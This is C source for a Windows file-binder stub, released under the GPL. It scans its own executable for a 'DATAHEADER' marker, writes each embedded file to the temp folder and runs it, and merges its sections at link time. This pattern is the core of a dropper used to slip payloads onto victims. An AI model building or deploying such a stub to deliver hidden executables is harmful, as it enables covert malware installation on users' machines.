/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



#pragma optimize("gsy", on)
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/SECTION:.text,EWR")

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")


#include <stdlib.h>
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include "resource.h"

#define WIN32_LEAN_AND_MEAN
#define STUB_EOF 30000
#define DATA_HEADER "DATAHEADER"
#define MAX_BUF_SIZE 1024


struct file_data 
{
  char lDataHeader[12];
  char lName[40];
  int lSize;
} *pfile_data;



/*
 * Program entry point
 *
 */

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
  HANDLE hStub;
  HANDLE hFile;
  DWORD dwBytesRead;
  DWORD dwBytesWritten;
  char lThisFile[MAX_BUF_SIZE];
  char lTempPath[MAX_BUF_SIZE];
  char *lBuffer = NULL;
  struct file_data lFD;
  int lRetVal = 0;
  int lCounter = 0;
  int lFileSize = 0;
  char *lTempPointer = NULL;
  HICON hMyIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON));

  pfile_data = &lFD;

  GetModuleFileName(NULL, lThisFile, MAX_BUF_SIZE);
  if ((hStub = CreateFile(lThisFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
  {
    lRetVal = 1;
    goto END;
  }

  lFileSize = GetFileSize(hStub, 0);
  if(!(lBuffer = (char *) malloc(lFileSize)))
  {
    lRetVal = 2;
    goto END;
  }

  ReadFile(hStub, lBuffer, lFileSize, &dwBytesRead, NULL);




  for (lCounter = STUB_EOF; lCounter <= lFileSize - strlen(DATA_HEADER); lCounter++)
  {
    if (memcmp(&lBuffer[lCounter], DATA_HEADER, strlen(DATA_HEADER)) == 0)
    {
      /*
       * Extract data
       *
       */

      pfile_data = (file_data *) &lBuffer[lCounter];
      lCounter = lCounter + sizeof(file_data);

      if (lCounter + pfile_data->lSize > lFileSize)
      {
        lRetVal = 3;
        goto END;
      }

      lTempPointer = &lBuffer[lCounter];
      ZeroMemory(lTempPath, sizeof(lTempPath));
      GetTempPath(sizeof(lTempPath), lTempPath);
      lstrcat(lTempPath, "\\");
      lstrcat(lTempPath, pfile_data->lName);

      if((hFile = CreateFile(lTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
      {
        lRetVal = 4;
        goto END;
      }

      WriteFile(hFile, lTempPointer, pfile_data->lSize, &dwBytesWritten, NULL);
      CloseHandle(hFile);

      ShellExecute(NULL, "open", lTempPath, NULL, NULL, SW_SHOWNORMAL);
      lCounter = lCounter + pfile_data->lSize  - 1;
    }
  }

END:
  if (lBuffer != NULL)
    free(lBuffer);

  if (hStub != INVALID_HANDLE_VALUE)
    CloseHandle(hStub);

  if (hFile != INVALID_HANDLE_VALUE)
    CloseHandle(hFile);

  Sleep(1000);

  return(lRetVal);
}